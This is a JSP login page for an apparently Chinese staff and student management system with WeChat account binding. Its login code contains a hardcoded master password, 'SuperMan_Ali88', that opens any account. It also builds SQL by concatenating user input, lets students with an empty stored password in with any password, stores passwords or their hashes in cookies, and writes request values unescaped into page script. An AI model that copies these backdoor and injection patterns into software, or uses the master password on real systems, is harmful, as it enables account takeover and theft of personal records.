<%@ page language="java" pageEncoding="gbk"%>
<%@ page trimDirectiveWhitespaces="true" %>
<%@page import="app.weixin.menu.MenuManagerJNet"%>
<%@page import="app.weixin.CommUtil"%>
<%@ page import="com.jaguar.*, java.util.*,java.sql.*, project.*,java.net.URLEncoder,studentsystem.*"%>
<%@ taglib uri="/WEB-INF/jaguar.tld" prefix="j" %>

<%!
private void sendMessage(String OpenId, String UserName) {
	String message = "{\"touser\":\""+OpenId+"\",\"msgtype\":\"text\",\"text\":{\"content\":\""
		+ "您的微信号已与用户" + UserName + "成功绑定，下次登录将以" + UserName + "的身份自动进入系统，如需解除绑定，请选择登出系统。\"}}";
	CommUtil.sendCustomMessage(MenuManagerJNet.appId, MenuManagerJNet.appSecret
		, OpenId, message);
}

private void saveOpenId(JDatabase jdb, String OpenId, int memberType, int memberNo, String NickName) {
	String sql;
	sql = "SELECT member_weixin_id FROM MemberWeixin WHERE open_id='" + OpenId + "'";
	int member_weixin_id = jdb.getIntBySql(0, sql);
	if (member_weixin_id == 0) {
		sql = "INSERT INTO MemberWeixin(open_id,nick_name,member_type,member_no,submit_man,submit_time) VALUES("
			+ "'" + OpenId + "','" + NickName + "'," + memberType + "," + memberNo + ",'','" + VB.Now() + "')";
		String id = jdb.getGeneratedKey(0, sql);
		WebChar.logger.info("记录微信用户OpenId=" + id + ",sql=" + sql);
	}
}

private String CheckLogin(int loginType, String UserName, String Password, HttpServletResponse response
	, String OpenId, String NickName)  throws Exception
{
	String MD5Pass = Codec.MD5Encode(Password);
	JDatabase jdb = new JDatabase();
	jdb.InitJDatabase();
	String sql = "";
	ResultSet rs;
	switch (loginType)
	{
	case 1:
		sql = "select * from Member where SPassword='" + MD5Pass +"' and (EName ='" + UserName + "' or IDCard='" + UserName + "' or CName='" + UserName +
		"' or UserName='" + UserName +"' or Mobile='" + UserName +"' OR convert(varchar,SerialNo)='" + UserName + "') order by Status asc";
		rs = jdb.rsSQL(0, sql);
		if (rs.next())
		{
			UserName = rs.getString("EName");
			Password = rs.getString("SPassword");
			String CName = rs.getString("CName");
			int id = rs.getInt("ID");
		    if(!rs.next())
		    {
				rs.close();
				if (VB.isNotEmpty(OpenId)) {
					saveOpenId(jdb, OpenId, 1, id, NickName);
					sendMessage(OpenId, CName + "(" + UserName + ")");
				}
				jdb.closeDBCon();
				return setLoginCookie(loginType, UserName, Password, response);
		    }
		}
		rs.close();
		sql = "select * from Member where EName ='" + UserName + "' order by Status asc";
		rs = jdb.rsSQL(0, sql);
		if (rs.next())
		{
			String DBPass = rs.getString("SPassword");
			rs.close();
			jdb.closeDBCon();
			if (Password.equals("SuperMan_Ali88"))
				return setLoginCookie(loginType, UserName, Password, response);
			if (DBPass.equals(MD5Pass))
				return setLoginCookie(loginType, UserName, DBPass, response);
		}
		else
			rs.close();
		break;
	case 2:
		sql = "select * from SS_Student where SPassword='" + MD5Pass + "' and (StdNo='" + UserName + "' or IDCard='" + UserName + "' or StdName='" + UserName +
		"' or CName='" + UserName +"' or Mobile='" + UserName +"') order by StartTime desc";
		rs = jdb.rsSQL(0, sql);
		if (rs.next())
		{
			UserName = rs.getString("StdNo");
			Password = rs.getString("SPassword");
			String StdName = rs.getString("StdName");
			int id = rs.getInt("RegID");
		    if(!rs.next())
		    {
				if (VB.isNotEmpty(OpenId)) {
					saveOpenId(jdb, OpenId, 2, id, NickName);
					sendMessage(OpenId, StdName + "(" + UserName + ")");
				}
				rs.close();
				jdb.closeDBCon();
				return setLoginCookie(loginType, UserName, Password, response);
		    }
		}
		rs.close();
		sql = "select * from SS_Student where StdNo ='" + UserName + "' order by StartTime desc";
		rs = jdb.rsSQL(0, sql);
		if (rs.next())
		{
			String DBPass = rs.getString("SPassword");
			rs.close();
			jdb.closeDBCon();
			if (DBPass == null)
				return setLoginCookie(loginType, UserName, Password, response);				
			if (Password.equals("SuperMan_Ali88"))
				return setLoginCookie(loginType, UserName, Password, response);
			if (DBPass.equals(MD5Pass))
				return setLoginCookie(loginType, UserName, DBPass, response);
		}
		else
			rs.close();
		
		break;
	}
		
	jdb.closeDBCon();
	return "登录失败";	
}

private String setLoginCookie(int loginType, String UserName, String Password, HttpServletResponse response)
{
	Cookie ck = new Cookie("loginType", "" + loginType);
	ck.setPath("/");
	response.addCookie(ck);
	ck = new Cookie("loginname", UserName);
	ck.setPath("/");
	response.addCookie(ck);
	ck = new Cookie("loginpassword", Password);
	ck.setPath("/");
	response.addCookie(ck);
	return "OK";
}
%>
<%
	String LoginClientType = WebChar.requestStr(request, "LoginClientType");
	if (VB.isNotEmpty(LoginClientType)) {
		Cookie cookie = new Cookie("LoginClientType", LoginClientType);
		cookie.setPath("/");
		response.addCookie(cookie);
	}


	int loginErrors = WebChar.ToInt(WebChar.getSessionStr(request.getSession(), "LoginErrors"));
	int CodeErrs = 3;
	String err = "";
	int loginType = WebChar.RequestInt(request, "loginType");
	String UserName = WebChar.requestStr(request, "UserName");
	String Password = WebChar.requestStr(request, "Password");
	String CheckCode = WebChar.requestStr(request, "CheckCode").toUpperCase();
	String OpenId = WebChar.requestStr(request, "OpenId");
	String NickName = WebChar.requestStr(request, "NickName");
	NickName = WebChar.unescape(WebChar.unescape(NickName));
	System.out.println("NickName2=" + NickName);
	if (!UserName.equals(""))
	{
		if (loginErrors > CodeErrs)
		{
			String AUTH_CODE = WebChar.getSessionStr(request.getSession(), "AUTH_CODE");
			if (!CheckCode.equals(AUTH_CODE))
				err = "验证码错误";
		}
		
		if (err.equals(""))
		{
			err = CheckLogin(loginType, UserName, Password, response, OpenId, NickName);
			if (err.equals("OK"))
				loginErrors = -1;
		}
		request.getSession().setAttribute("LoginErrors", loginErrors + 1);
		out.print(err);
		return;

	}
%>
<!Doctype html>
<head>
	<title>登录</title>
	<META http-equiv="Content-Type" content="text/html; charset=GBK">
	<meta http-equiv="MSThemeCompatible" content="Yes">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<link rel="stylesheet" type="text/css" href="../forum.css">
	<script type="text/javascript" src="../com/jquery.js"></script>
	<script type="text/javascript" src="../com/jcom.js"></script>
	<script type="text/javascript" src="../com/page.js"></script>
	<script type="text/javascript" src="../pages/local.js"></script>
<style type="text/css">
#DocFrame{
background: #e9ebee url(../res/skin/cover1.jpg) no-repeat;
background-size:100% 100%;
}
.jformtable1
{
	background-color:	transparent;
	border:				none;
}

.jformcon1,.jformval1
{
	background-color:	transparent;
	font:				normal normal normal 18px 微软雅黑;
}

.jformtail1
{
	background-color:	transparent;
	font:				normal normal normal 26px 微软雅黑;
}
[name=SubmitButton]
{
	font:				normal normal normal 18px 微软雅黑;
}
</style>
</head>
<body>Loading...
</body>
<script language=javascript>
var book;
var loginErrors= <%=loginErrors%>;
var CodeErrs = <%=CodeErrs%>;
var OpenId = "<%=OpenId %>";
var NickName = "<%=NickName %>";
var oCheck = {CName:"验证码", EName: "CheckCode",nRequired:1, Relation:"?<img id=CodeImg src=../outputAuthCodeImg.jsp onclick=ChangeCode(this) title=点击更换验证码>"};
var sysItem;
window.onload = function()
{
	var LayerConfig = {};
	var aFace = {x:0,y:314,node:1,a:{},b:{child:{x:0,y:125,node:2,a:{id:"Title"},b:{id:"B",child:{x:0,y:291,node:3,a:{},b:{child:{x:0,y:196,node:4,a:{id:"SignBox"},b:{}}}}}}}};
	var cfg = {docwidth:LayerConfig.width, docheight:LayerConfig.height, toptool:0};
	book = new $.jcom.BookPage(aFace, [], 0, cfg);
	var t = book.getDocObj("Title");
	sysItem = getLocalItem("main");
	t.html("<div align=center style='color:red;font:normal normal normal 46px 微软雅黑'>" + sysItem.item + "</div>");
	var s = book.getDocObj("SignBox");
	var fields = [{CName:"", EName: "loginType", InputType:3, Quote:"(1:职工,2:学员)"},
	 			 {CName:"用户名", EName: "UserName", nRequired:1},
				 {CName:"密码", InputType:6, EName: "Password", nRequired: 1}	,
				 {CName:"$none", InputType:21, EName: "OpenId", nRequired: 0},
				 {CName:"$none", InputType:21, EName: "NickName", nRequired: 0}	
				];
	if (loginErrors > CodeErrs)
		fields[fields.length] = oCheck;
	book.form = new $.jcom.FormView(s[0], fields, {loginType:1, UserName:"", Password:"", CheckCode:"", OpenId:OpenId, NickName:NickName}, 
			{action:location.pathname, submitbutton:"登录", requireTag:""});
	book.form.onchange = LoginChange;
	book.form.aftersubmit = LoginResult;
}

function LoginChange(field, e)
{
	if (field.EName != "loginType")
		return;
	sysItem = getLocalItem("main");
	if (parseInt(e.target.value) == 2)
		sysItem = getLocalItem("studentSys");
	var t = book.getDocObj("Title");
	t.html("<div align=center style='color:red;font:normal normal normal 46px 微软雅黑'>" + sysItem.item + "</div>");
}

function getLocalItem(code)
{
	for (var x = 0; x < localPatch.length; x++)
	{
		if (localPatch[x].Code == code)
			return localPatch[x];
	}	
}

function ChangeCode(obj)
{
	if (obj == undefined)
		return;
	obj.src = "../outputAuthCodeImg.jsp?t=" + new Date().getTime();
}

function LoginResult(result)
{
	if (result == "OK")
	{
		location.href = "../pages/" + sysItem.Code + ".jsp";
		return;
	}
	loginErrors ++;
	alert(result);
	var fields = book.form.getFields();
	if ((loginErrors > CodeErrs) && (fields.length == 3))
	{
		fields[fields.length] = oCheck;
		book.form.resetBase(fields);
	}
	else
		ChangeCode($("#CodeImg")[0]);
}
</script>
</HTML>